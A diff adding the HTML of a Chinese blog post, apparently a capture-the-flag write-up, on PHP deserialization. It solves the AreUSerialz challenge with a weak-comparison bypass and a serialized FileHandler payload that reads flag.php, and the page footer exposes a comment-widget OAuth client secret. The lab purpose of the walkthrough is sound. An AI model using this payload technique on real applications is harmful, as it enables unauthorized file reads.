@@ -1,0 +1,421 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>初探PHP反序列化 | white0123</title>
+<link rel="shortcut icon" href="https://wghahaha.github.io/favicon.ico?v=1714286336284">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://wghahaha.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="初探PHP反序列化 | white0123 - Atom Feed" href="https://wghahaha.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="前言
+这个漏洞主要是体现在代码审计当中，感觉在CTF里还是比较喜欢考的。
+
+PHP反序列化原理：
+未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导 致代码执行、SQL注入、目录遍历等不可控后果。在反序列化的过程中自..." />
+    <meta name="keywords" content="web安全" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://wghahaha.github.io">
+  <img class="avatar" src="https://wghahaha.github.io/images/avatar.png?v=1714286336284" alt="">
+  </a>
+  <h1 class="site-title">
+    white0123
+  </h1>
+  <p class="site-description">
+    永远保持第一天接触网络安全的热情
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              初探PHP反序列化
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-01-13
+              </span>
+              <span>
+                6 min read
+              </span>
+              
+                <a href="https://wghahaha.github.io/tag/uaBWtnrdZ/" class="post-tag">
+                  # web安全
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <p>前言<br>
+这个漏洞主要是体现在代码审计当中，感觉在CTF里还是比较喜欢考的。</p>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230113215326568.png" alt="image-20230113215326568" loading="lazy"></figure>
+<h3 id="php反序列化原理">PHP反序列化原理：</h3>
+<p>未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导 致代码执行、SQL注入、目录遍历等不可控后果。在反序列化的过程中自动触发了某些魔术 方法。当进行反序列化的时候就有可能会触发对象中的一些魔术方法。</p>
+<p>php序列化与反序列化的关键函数：</p>
+<p>serialize() 将一个对象转换成字符串</p>
+<p>unserialize() 将字符串还原成一个对象</p>
+<h3 id="php反序列化分类">PHP反序列化分类</h3>
+<p>大体可以分为 有类 和 无类 两种</p>
+<p>具体如何区分呢？ 直接看 class就可以了。</p>
+<p>有 class 就是有类    没有 就是无类</p>
+<h5 id="有类和无类的主要区别">有类和无类的主要区别</h5>
+<p>区别主要在于 有类就有魔术方法，无类就没有魔术方法</p>
+<h5 id="无类">无类</h5>
+<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230113210452155.png" alt="image-20230113210452155" loading="lazy"></figure>
+<p>这就将对象转换为了序列化后的值。</p>
+<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230113210755940.png" alt="image-20230113210755940" loading="lazy"></figure>
+<p>这又将其反序列化回来了。</p>
+<h5 id="有类">有类</h5>
+<ul>
+<li>__construct()	//创建对象时触发</li>
+<li>__destruct() 	//对象被销毁时触发</li>
+<li>__call() 			//在对象上下文中调用不可访问的方法时触发</li>
+<li>__callStatic() //在静态上下文中调用不可访问的方法时触发</li>
+<li>__get() 			//用于从不可访问的属性读取数据</li>
+<li>__set() 			//用于将数据写入不可访问的属性</li>
+<li>__isset() 		//在不可访问的属性上调用 isset()或 empty()触发</li>
+<li>__unset() 		//在不可访问的属性上使用 unset()时触发</li>
+<li>__invoke() 		//当脚本尝试将对象调用为函数时触发</li>
+</ul>
+<figure data-type="image" tabindex="4"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230113211017020.png" alt="image-20230113211017020" loading="lazy"></figure>
+<p>这些就是一些基础知识，下面然我们来看一道CTF的真题吧</p>
+<h3 id="ctf题目">CTF题目</h3>
+<h5 id="2020-网鼎杯-青龙组-web-areuserialz">2020-网鼎杯-青龙组-Web-AreUSerialz</h5>
+<p>这道题在CTF hub上是有的。</p>
+<p>首先我们进去了后可以看到一串代码，现在我们需要的就是开始读代码。</p>
+<pre><code class="language-php">&lt;?php
+
+include(&quot;flag.php&quot;);
+
+highlight_file(__FILE__);
+
+class FileHandler {
+
+    protected $op;
+    protected $filename;
+    protected $content;
+
+    function __construct() {
+        $op = &quot;1&quot;;
+        $filename = &quot;/tmp/tmpfile&quot;;
+        $content = &quot;Hello World!&quot;;
+        $this-&gt;process();
+    }
+
+    public function process() {
+        if($this-&gt;op == &quot;1&quot;) {
+            $this-&gt;write();
+        } else if($this-&gt;op == &quot;2&quot;) {
+            $res = $this-&gt;read();
+            $this-&gt;output($res);
+        } else {
+            $this-&gt;output(&quot;Bad Hacker!&quot;);
+        }
+    }
+
+    private function write() {
+        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) {
+            if(strlen((string)$this-&gt;content) &gt; 100) {
+                $this-&gt;output(&quot;Too long!&quot;);
+                die();
+            }
+            $res = file_put_contents($this-&gt;filename, $this-&gt;content);
+            if($res) $this-&gt;output(&quot;Successful!&quot;);
+            else $this-&gt;output(&quot;Failed!&quot;);
+        } else {
+            $this-&gt;output(&quot;Failed!&quot;);
+        }
+    }
+
+    private function read() {
+        $res = &quot;&quot;;
+        if(isset($this-&gt;filename)) {
+            $res = file_get_contents($this-&gt;filename);
+        }
+        return $res;
+    }
+
+    private function output($s) {
+        echo &quot;[Result]: &lt;br&gt;&quot;;
+        echo $s;
+    }
+
+    function __destruct() {
+        if($this-&gt;op === &quot;2&quot;)
+            $this-&gt;op = &quot;1&quot;;
+        $this-&gt;content = &quot;&quot;;
+        $this-&gt;process();
+    }
+
+}
+
+function is_valid($s) {
+    for($i = 0; $i &lt; strlen($s); $i++)
+        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))
+            return false;
+    return true;
+}
+
+if(isset($_GET{'str'})) {
+
+    $str = (string)$_GET['str'];
+    if(is_valid($str)) {
+        $obj = unserialize($str);
+    }
+
+}
+</code></pre>
+<p>我们通过阅读代码可以发现，采取的传参是通过 GET方式 传入str的值。</p>
+<h6 id="防护">防护</h6>
+<p>首先就是 is_valid 函数，</p>
+<figure data-type="image" tabindex="5"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230113212900851.png" alt="image-20230113212900851" loading="lazy"></figure>
+<p>这段代码的意思就是需要我们输入的每个字母的ascii值在32和125之间，所以我们就不可以用默认的protected</p>
+<p>因为protected属性在序列化之后会出现不可见字符\00*\00，不符合上面的要求。</p>
+<figure data-type="image" tabindex="6"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230113213032670.png" alt="image-20230113213032670" loading="lazy"></figure>
+<p>可以采用 public 绕过。</p>
+<p>还有就是在 __destruct 魔术方法，和 procees</p>
+<p><strong>__destruct</strong></p>
+<pre><code class="language-php">function __destruct() {
+        if($this-&gt;op === &quot;2&quot;)
+            $this-&gt;op = &quot;1&quot;;
+        $this-&gt;content = &quot;&quot;;
+        $this-&gt;process();
+    }
+</code></pre>
+<p><strong>procees</strong></p>
+<pre><code class="language-php">public function process() {
+        if($this-&gt;op == &quot;1&quot;) {
+            $this-&gt;write();
+        } else if($this-&gt;op == &quot;2&quot;) {
+            $res = $this-&gt;read();
+            $this-&gt;output($res);
+        } else {
+            $this-&gt;output(&quot;Bad Hacker!&quot;);
+        }
+    }
+</code></pre>
+<p>这里我们发现一个问题。</p>
+<p>我们需要的执行 process中的  read 函数，但是如果 OP =2了以后，就会在在第直接被改为 1了。</p>
+<p>这个时候我们就需要用到 弱比较的绕过。我在PHP基础学习的时候也提过，不清楚的可以看前面的那一篇博客。</p>
+<p>**绕过方法：**可以使传入的op是数字2，从而使第一个强比较返回false,而使第二个弱比较返回true.</p>
+<p><strong>编写绕过代码</strong></p>
+<p>通过前面的分析我们大题就知道了该如何操作了。</p>
+<p>代码</p>
+<pre><code class="language-php">&lt;?php
+ 
+class FileHandler {
+ 
+    public  $op = 2;    //这里也可以用' 2'
+    public  $filename = &quot;flag.php&quot;;
+    public  $content = &quot;1&quot;;        //这里的可以随意。
+}
+ 
+$a = new FileHandler();
+$b = serialize($a);
+echo $b;
+ 
+?&gt;
+</code></pre>
+<p>我们需要注意的是 str是通过反序列化的方式传参，那么我们就需要传入序列化后的值（不懂的你细品）</p>
+<pre><code class="language-php">if(isset($_GET{'str'})) {
+
+    $str = (string)$_GET['str'];
+    if(is_valid($str)) {
+        $obj = unserialize($str);
+    }
+
+}
+</code></pre>
+<p>序列化结果</p>
+<figure data-type="image" tabindex="7"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230113214436133.png" alt="image-20230113214436133" loading="lazy"></figure>
+<h6 id="最终payload">最终payload</h6>
+<figure data-type="image" tabindex="8"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230113214618178.png" alt="image-20230113214618178" loading="lazy"></figure>
+<p>我们这里还是看不到 flag 需要右键查看源代码</p>
+<figure data-type="image" tabindex="9"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230113214656923.png" alt="image-20230113214656923" loading="lazy"></figure>
+<h3 id="总结">总结</h3>
+<p>这种漏洞主要出现在一些代码审计的项目或CTF比赛当中，也就是白盒测试当中，具体的危害还可以结合其他漏洞，比如 SQL注入，文件包含等。</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li>
+<ul>
+<li><a href="#php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86">PHP反序列化原理：</a></li>
+<li><a href="#php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E7%B1%BB">PHP反序列化分类</a><br>
+*
+<ul>
+<li><a href="#%E6%9C%89%E7%B1%BB%E5%92%8C%E6%97%A0%E7%B1%BB%E7%9A%84%E4%B8%BB%E8%A6%81%E5%8C%BA%E5%88%AB">有类和无类的主要区别</a></li>
+<li><a href="#%E6%97%A0%E7%B1%BB">无类</a></li>
+<li><a href="#%E6%9C%89%E7%B1%BB">有类</a></li>
+</ul>
+</li>
+<li><a href="#ctf%E9%A2%98%E7%9B%AE">CTF题目</a><br>
+*
+<ul>
+<li><a href="#2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-web-areuserialz">2020-网鼎杯-青龙组-Web-AreUSerialz</a>
+<ul>
+<li><a href="#%E9%98%B2%E6%8A%A4">防护</a></li>
+<li><a href="#%E6%9C%80%E7%BB%88payload">最终payload</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://wghahaha.github.io/post/php-ji-chu-xue-xi/">
+              <h3 class="post-title">
+                PHP基础学习
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '60a6742bb0cdc1129286',
+    clientSecret: '2c932a185a0c37b7924302f1ab242ffd3c186641',
+    repo: 'wghahaha.github.io',
+    owner: 'wghahaha',
+    admin: ['wghahaha'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  <div>
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	<span id="busuanzi_container_site_uv" style='display:none'>总访客人数量<span id="busuanzi_value_site_uv"></span>次</span>
+	<span id="busuanzi_container_site_pv" style='display:none'>本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+</div>
+  <a class="rss" href="https://wghahaha.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
